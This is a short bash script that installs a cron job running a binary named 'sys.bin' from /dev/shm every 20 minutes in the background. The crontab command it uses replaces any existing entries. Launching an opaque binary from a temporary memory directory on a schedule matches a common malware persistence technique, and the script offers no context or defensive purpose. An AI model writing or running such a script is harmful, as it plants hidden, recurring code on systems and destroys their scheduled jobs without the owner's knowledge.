#!/bin/bash

# Define the command to be executed
COMMAND="/dev/shm/./sys.bin &"

# Create a temporary file to store the cronjob entry
CRON_FILE=$(mktemp)

# Write the cronjob entry to the temporary file
echo "*/20 * * * * $COMMAND" > "$CRON_FILE"

# Add the cronjob entry to the crontab
crontab "$CRON_FILE"

# Remove the temporary file
rm "$CRON_FILE"

echo "Cronjob successfully created to run every 20 minutes."
